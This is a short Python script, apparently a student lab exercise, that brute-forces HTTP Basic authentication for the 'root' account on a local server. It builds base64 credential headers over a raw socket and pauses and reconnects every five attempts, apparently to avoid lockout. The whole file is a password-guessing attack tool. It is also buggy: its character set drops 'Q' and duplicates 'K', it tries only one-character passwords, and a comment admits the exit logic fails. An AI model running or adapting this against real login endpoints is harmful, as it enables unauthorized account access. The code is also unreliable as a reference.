#from const import *
import base64
import socket
import itertools
import selectors
import random
import time

class zerg:
    # Get it get it it's a zerg rush
    # StarCraft ref - they're played by bruteforce :D
    # like here :D
    # until we can bamboozle the server that is

    def __init__(self, name: str = ""):
        #self.sel = selectors.DefaultSelector()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.name = name
        self.HOST = "127.0.0.1" #"host.docker.internal"
        self.PORT = 8000
        self.alive = True
        self.pws_tried = []
        self.connect()
        self.found=False


    def connect(self):
        """Connect to chat server and setup stdin flags."""
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.HOST, self.PORT))

    def try_pw(self,pw :str):
        """Creates the AuthHeader with the created pw""" #password, not powerword - a priest would help here though
        ID = "root"

        authHead = ID+":"+pw
        authHeadB64 = base64.b64encode(authHead.encode()).decode()

        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\r\n\r\n'''  #internet says to use carriage return but not sure why
        
        print("testing pw:",pw)
        self.pws_tried.append(pw)
        msg = httpHeader
        self.send_msg(msg)

    def send_msg(self,msg):
        encoded_msg=str(msg).encode("utf-8")          
        self.s.send(encoded_msg)
        self.server_response()
        
    def server_response(self):
        incoming=""
        while not "\r\n\r\n" in incoming:
            try:
                incoming_raw=self.s.recv(500)
                incoming=incoming+incoming_raw.decode("ascii")
                
            except UnicodeDecodeError:
                # I think we're supposed to receive a picture here but this is a puzzle for future camila :P
                break
            
        if  '200' in incoming.split("\n")[0]:
            self.found=True
            print("GOT IT!\nwas it "+self.pws_tried[-1]+"?")
    

    def loop(self):
        while self.alive:
            if not self.found:
                print("all your base are belong to us") #nice ref :D
                chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPKRSTUVWXYZ"
                n = 1
                count = 0
                for i in range(1, n+1):
                    for item in itertools.product(chars):
                        if not self.found:
                            self.try_pw(item[0])
                            count+=1
                            if count >4: #target->5
                                time.sleep(600/100) #nao gosto desta linha
                                count = 0
                                self.connect()
                        else:
                                print("it was "+self.pws_tried[-1])
                                return self.pws_tried[-1]
            else:
                break #doesnt work lol


slave = zerg("Brood1")
slave.loop()
            
            